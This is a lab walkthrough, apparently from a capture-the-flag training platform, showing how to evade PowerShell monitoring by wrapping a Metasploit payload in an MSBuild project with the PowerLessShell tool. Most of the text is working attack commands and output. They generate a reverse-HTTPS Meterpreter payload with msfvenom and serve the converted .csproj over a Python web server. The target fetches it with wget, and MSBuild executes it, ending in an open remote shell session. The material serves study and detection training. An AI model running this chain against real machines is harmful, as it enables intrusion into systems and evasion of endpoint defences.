# No PowerShell

In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for 
malicious activities. Therefore, Organisations started to monitor or block `powershell.exe` from being executed. As a 
result, adversaries find other ways to run PowerShell code without spawning it.

PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an 
instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a 
platform for building Windows applications, to execute remote code.

## Lab

```text
$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
$ ls 
PowerLessShell
```

Generate a PowerShell payload:

```text
$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.18.22.77 LPORT=4444 -f psh-reflection > liv0ff.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 929 bytes
Final size of psh-reflection file: 3787 bytes
$ ls
liv0ff.ps1  PowerLessShell
```

Run the Metasploit framework to listen and wait for the reverse shell:

```text
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4444 ;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => AttackBox_IP lport => 4444 
[*] Started HTTPS reverse handler on https://AttackBox_IP:4444 
```

Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run 
the PowerLessShell tool and set the source file to the one created with msfvenom:

```text
$ cd PowerLessShell
$ python2 PowerLessShell.py -type powershell -source ../liv0ff.ps1 -output liv0ff.csproj  
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-powershell.csproj as the template
File 'liv0ff.csproj' created
Process completed
```

Transfer the output file to the target machine with `scp` or setting a web server to host the file on the attacking
machine and downloading the file using a browser.

```text
$ python3 -m http.server
```

On the target machine:

```text
PS C:\Users\thm\Desktop> wget http://10.18.22.77:8000/liv0ff.csproj -O liv0ff.csproj
```

Build the `.csproj` file and wait for the reverse shell:

```text
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
Microsoft (R) Build Engine version 4.8.3761.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 11/5/2022 9:31:42 PM.
```

On the attack machine:

```text
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.18.22.77;set lport 4444;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => 10.18.22.77
lport => 4444
[*] Started HTTPS reverse handler on https://10.18.22.77:4444
[!] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Without a database connected that payload UUID tracking will not work!
[*] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Staging x86 payload (176732 bytes) ...
[!] https://10.18.22.77:4444 handling request from 10.10.60.49; (UUID: s5qzyosq) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.18.22.77:4444 -> 10.10.60.49:50104) at 2022-11-05 21:32:09 +0000

meterpreter > 
```

The Desktop of the thm user on the target machine now has a flag.txt file.

## Resources

* [theonlykernel/atomic-red-team](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)

